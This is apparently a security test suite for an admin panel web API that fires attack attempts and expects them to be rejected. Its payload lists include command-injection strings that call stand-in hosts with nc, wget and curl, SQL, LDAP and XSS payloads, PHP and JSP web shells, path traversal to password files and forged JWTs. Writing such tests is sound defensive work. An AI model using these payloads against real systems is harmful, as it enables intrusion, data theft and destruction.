import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import request from 'supertest';
import { app } from '../../app.js';
import { PrismaClient } from '@prisma/client';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';

const prisma = new PrismaClient();

describe('Admin Panel Penetration Tests', () => {
  let adminToken, testAdmin;

  beforeAll(async () => {
    // Create test admin
    testAdmin = await prisma.user.create({
      data: {
        email: 'pentest-admin@test.com',
        name: 'Pentest Admin',
        role: 'ADMIN',
        password: await bcrypt.hash('testpassword', 10),
        status: 'ACTIVE'
      }
    });

    adminToken = jwt.sign(
      { userId: testAdmin.id, role: 'ADMIN' },
      process.env.JWT_SECRET || 'test-secret',
      { expiresIn: '1h' }
    );
  });

  afterAll(async () => {
    await prisma.user.deleteMany({
      where: { email: { contains: 'pentest-' } }
    });
    await prisma.$disconnect();
  });

  describe('Authentication Bypass Attempts', () => {
    it('should prevent JWT token manipulation', async () => {
      // Test various JWT manipulation techniques
      const manipulationAttempts = [
        // None algorithm attack
        jwt.sign({ userId: testAdmin.id, role: 'ADMIN' }, '', { algorithm: 'none' }),
        
        // Key confusion attack
        jwt.sign({ userId: testAdmin.id, role: 'ADMIN' }, 'public-key', { algorithm: 'HS256' }),
        
        // Algorithm confusion
        jwt.sign({ userId: testAdmin.id, role: 'ADMIN' }, process.env.JWT_SECRET || 'test-secret', { algorithm: 'RS256' }),
        
        // Expired token with modified exp claim
        (() => {
          const payload = { userId: testAdmin.id, role: 'ADMIN', exp: Math.floor(Date.now() / 1000) + 3600 };
          return jwt.sign(payload, 'wrong-secret');
        })(),
        
        // Token with modified role
        jwt.sign({ userId: 'customer-id', role: 'ADMIN' }, process.env.JWT_SECRET || 'test-secret')
      ];

      for (const token of manipulationAttempts) {
        await request(app)
          .get('/api/admin/users')
          .set('Authorization', `Bearer ${token}`)
          .expect(401);
      }
    });

    it('should prevent session fixation attacks', async () => {
      // Attempt to use a pre-generated session token
      const fixedToken = jwt.sign(
        { userId: 'attacker-id', role: 'ADMIN' },
        'attacker-secret'
      );

      await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${fixedToken}`)
        .expect(401);
    });

    it('should prevent timing attacks on authentication', async () => {
      const validEmail = testAdmin.email;
      const invalidEmail = 'nonexistent@test.com';
      const password = 'wrongpassword';

      // Measure response times
      const validEmailTime = await measureResponseTime(() =>
        request(app)
          .post('/api/auth/login')
          .send({ email: validEmail, password })
      );

      const invalidEmailTime = await measureResponseTime(() =>
        request(app)
          .post('/api/auth/login')
          .send({ email: invalidEmail, password })
      );

      // Response times should be similar to prevent user enumeration
      const timeDifference = Math.abs(validEmailTime - invalidEmailTime);
      expect(timeDifference).toBeLessThan(100); // Less than 100ms difference
    });
  });

  describe('Authorization Bypass Attempts', () => {
    it('should prevent parameter pollution attacks', async () => {
      // Attempt to bypass authorization with parameter pollution
      await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${adminToken}`)
        .query({ role: ['ADMIN', 'CUSTOMER'] }) // Array parameter pollution
        .expect(200);

      // Should not return customers when filtering by admin role
      // (This test assumes proper parameter handling)
    });

    it('should prevent HTTP method override attacks', async () => {
      // Attempt to use method override headers to bypass restrictions
      const methodOverrideAttempts = [
        { header: 'X-HTTP-Method-Override', value: 'DELETE' },
        { header: 'X-Method-Override', value: 'PUT' },
        { header: 'X-HTTP-Method', value: 'PATCH' }
      ];

      for (const { header, value } of methodOverrideAttempts) {
        await request(app)
          .get('/api/admin/users/some-id')
          .set('Authorization', `Bearer ${adminToken}`)
          .set(header, value)
          .expect(200); // Should still be treated as GET, not the overridden method
      }
    });

    it('should prevent privilege escalation through role manipulation', async () => {
      // Create a customer user
      const customer = await prisma.user.create({
        data: {
          email: 'pentest-customer@test.com',
          name: 'Pentest Customer',
          role: 'CUSTOMER',
          password: await bcrypt.hash('password', 10)
        }
      });

      const customerToken = jwt.sign(
        { userId: customer.id, role: 'CUSTOMER' },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Attempt to escalate privileges by modifying own role
      await request(app)
        .put(`/api/users/${customer.id}`)
        .set('Authorization', `Bearer ${customerToken}`)
        .send({ role: 'ADMIN' })
        .expect(403);

      // Attempt to access admin endpoints
      await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${customerToken}`)
        .expect(403);
    });
  });

  describe('Injection Attack Prevention', () => {
    it('should prevent SQL injection in search queries', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1' --",
        "'; INSERT INTO users (email, role) VALUES ('hacker@evil.com', 'ADMIN'); --",
        "' UNION SELECT password FROM users WHERE role='ADMIN' --",
        "'; UPDATE users SET role='ADMIN' WHERE email='pentest-customer@test.com'; --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get('/api/admin/users/search')
          .set('Authorization', `Bearer ${adminToken}`)
          .query({ q: payload })
          .expect(200);

        // Should not return any suspicious results or cause errors
        expect(response.body).toHaveProperty('results');
        expect(Array.isArray(response.body.results)).toBe(true);
      }
    });

    it('should prevent NoSQL injection attacks', async () => {
      const noSqlInjectionPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.role === "ADMIN"' },
        { $or: [{ role: 'ADMIN' }, { role: 'CUSTOMER' }] }
      ];

      for (const payload of noSqlInjectionPayloads) {
        await request(app)
          .post('/api/admin/users/search')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ filters: payload })
          .expect(400); // Should reject malformed queries
      }
    });

    it('should prevent command injection in file operations', async () => {
      const commandInjectionPayloads = [
        'file.csv; rm -rf /',
        'file.csv && cat /etc/passwd',
        'file.csv | nc attacker.com 4444',
        'file.csv; wget http://evil.com/malware.sh',
        '$(curl http://evil.com/steal-data)'
      ];

      for (const payload of commandInjectionPayloads) {
        await request(app)
          .get('/api/admin/export')
          .set('Authorization', `Bearer ${adminToken}`)
          .query({ filename: payload })
          .expect(400); // Should reject invalid filenames
      }
    });

    it('should prevent LDAP injection attacks', async () => {
      const ldapInjectionPayloads = [
        'admin)(|(password=*))',
        'admin)(&(password=*)(role=admin))',
        '*)(role=admin',
        'admin)(|(objectClass=*))'
      ];

      for (const payload of ldapInjectionPayloads) {
        await request(app)
          .post('/api/auth/ldap-login')
          .send({ username: payload, password: 'password' })
          .expect(401); // Should reject malformed LDAP queries
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should prevent stored XSS in user data', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '"><script>alert("xss")</script>',
        '<img src="x" onerror="alert(\'xss\')">',
        'javascript:alert("xss")',
        '<svg onload="alert(\'xss\')">',
        '<iframe src="javascript:alert(\'xss\')"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .put(`/api/admin/users/${testAdmin.id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ name: payload })
          .expect(200);

        // Response should have escaped/sanitized the payload
        expect(response.body.name).not.toContain('<script>');
        expect(response.body.name).not.toContain('javascript:');
        expect(response.body.name).not.toContain('onerror=');
      }
    });

    it('should prevent reflected XSS in search results', async () => {
      const xssPayloads = [
        '<script>alert("reflected")</script>',
        '"><img src=x onerror=alert("reflected")>',
        'javascript:alert("reflected")'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .get('/api/admin/users/search')
          .set('Authorization', `Bearer ${adminToken}`)
          .query({ q: payload })
          .expect(200);

        // Response should not contain unescaped script content
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
        expect(responseText).not.toContain('onerror=');
      }
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Prevention', () => {
    it('should prevent CSRF attacks on state-changing operations', async () => {
      // Simulate CSRF attack from malicious origin
      await request(app)
        .post('/api/admin/bulk/suspend-users')
        .set('Authorization', `Bearer ${adminToken}`)
        .set('Origin', 'https://malicious-site.com')
        .set('Referer', 'https://malicious-site.com/attack.html')
        .send({ userIds: [testAdmin.id], reason: 'CSRF attack' })
        .expect(403);
    });

    it('should validate CSRF tokens for sensitive operations', async () => {
      // Attempt operation without CSRF token
      await request(app)
        .delete(`/api/admin/users/${testAdmin.id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(403);

      // Attempt with invalid CSRF token
      await request(app)
        .delete(`/api/admin/users/${testAdmin.id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .set('X-CSRF-Token', 'invalid-token')
        .expect(403);
    });
  });

  describe('File Upload Security', () => {
    it('should prevent malicious file uploads', async () => {
      const maliciousFiles = [
        { filename: 'malware.exe', content: 'MZ\x90\x00' }, // PE header
        { filename: 'script.php', content: '<?php system($_GET["cmd"]); ?>' },
        { filename: 'shell.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { filename: '../../../etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash' },
        { filename: 'normal.jpg', content: '\xFF\xD8\xFF\xE0<?php echo "hidden php"; ?>' }
      ];

      for (const { filename, content } of maliciousFiles) {
        await request(app)
          .post('/api/admin/upload')
          .set('Authorization', `Bearer ${adminToken}`)
          .attach('file', Buffer.from(content), filename)
          .expect(400); // Should reject malicious files
      }
    });

    it('should prevent path traversal in file operations', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '....//....//....//etc/passwd'
      ];

      for (const path of pathTraversalAttempts) {
        await request(app)
          .get('/api/admin/files')
          .set('Authorization', `Bearer ${adminToken}`)
          .query({ path })
          .expect(400);
      }
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    it('should prevent brute force attacks on login', async () => {
      const attempts = [];
      
      // Make multiple failed login attempts
      for (let i = 0; i < 20; i++) {
        attempts.push(
          request(app)
            .post('/api/auth/login')
            .send({
              email: testAdmin.email,
              password: 'wrongpassword'
            })
        );
      }

      const responses = await Promise.allSettled(attempts);
      const rateLimitedResponses = responses.filter(
        result => result.status === 'fulfilled' && result.value.status === 429
      );

      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should prevent resource exhaustion attacks', async () => {
      // Attempt to request extremely large datasets
      await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${adminToken}`)
        .query({ limit: 999999 })
        .expect(400); // Should reject excessive limits

      // Attempt to export massive amounts of data
      await request(app)
        .get('/api/admin/export')
        .set('Authorization', `Bearer ${adminToken}`)
        .query({ 
          type: 'users',
          limit: 1000000,
          format: 'csv'
        })
        .expect(400);
    });

    it('should prevent slowloris-style attacks', async () => {
      // Simulate slow request attack
      const slowRequests = Array.from({ length: 100 }, () =>
        new Promise((resolve) => {
          const req = request(app)
            .post('/api/admin/bulk/suspend-users')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({ userIds: [testAdmin.id], reason: 'slow attack' });
          
          // Simulate slow sending
          setTimeout(() => {
            req.end((err, res) => resolve({ err, res }));
          }, 5000);
        })
      );

      const results = await Promise.allSettled(slowRequests);
      
      // Server should handle or reject slow requests appropriately
      const timeoutResponses = results.filter(
        result => result.status === 'fulfilled' && 
        (result.value.err?.code === 'ECONNRESET' || result.value.res?.status === 408)
      );

      expect(timeoutResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Trigger various error conditions
      const errorTriggers = [
        () => request(app).get('/api/admin/users/invalid-uuid').set('Authorization', `Bearer ${adminToken}`),
        () => request(app).get('/api/admin/nonexistent-endpoint').set('Authorization', `Bearer ${adminToken}`),
        () => request(app).post('/api/admin/users').set('Authorization', `Bearer ${adminToken}`).send({}),
      ];

      for (const trigger of errorTriggers) {
        const response = await trigger();
        const responseText = JSON.stringify(response.body);
        
        // Should not expose sensitive information
        expect(responseText).not.toContain('password');
        expect(responseText).not.toContain('secret');
        expect(responseText).not.toContain('token');
        expect(responseText).not.toContain('database');
        expect(responseText).not.toContain('stack trace');
      }
    });

    it('should not expose system information in headers', async () => {
      const response = await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);

      // Should not expose server information
      expect(response.headers).not.toHaveProperty('server');
      expect(response.headers).not.toHaveProperty('x-powered-by');
      expect(response.headers).not.toHaveProperty('x-aspnet-version');
    });
  });

  describe('Business Logic Vulnerabilities', () => {
    it('should prevent race condition attacks', async () => {
      // Create a test user with limited resources
      const testUser = await prisma.user.create({
        data: {
          email: 'race-test@test.com',
          name: 'Race Test User',
          role: 'CUSTOMER',
          password: await bcrypt.hash('password', 10),
          credits: 100
        }
      });

      // Simulate concurrent requests that could cause race conditions
      const concurrentRequests = Array.from({ length: 10 }, () =>
        request(app)
          .post(`/api/users/${testUser.id}/spend-credits`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ amount: 50 })
      );

      const responses = await Promise.allSettled(concurrentRequests);
      const successfulResponses = responses.filter(
        result => result.status === 'fulfilled' && result.value.status === 200
      );

      // Should not allow spending more credits than available
      expect(successfulResponses.length).toBeLessThanOrEqual(2); // 100 credits / 50 = max 2 successful

      // Cleanup
      await prisma.user.delete({ where: { id: testUser.id } });
    });

    it('should prevent workflow bypass attacks', async () => {
      // Attempt to skip required approval steps
      await request(app)
        .post('/api/admin/bulk/delete-users')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ 
          userIds: [testAdmin.id],
          skipApproval: true // Should be ignored
        })
        .expect(400); // Should require proper approval workflow
    });
  });

  // Helper function to measure response time
  async function measureResponseTime(requestFn) {
    const start = Date.now();
    await requestFn();
    return Date.now() - start;
  }
});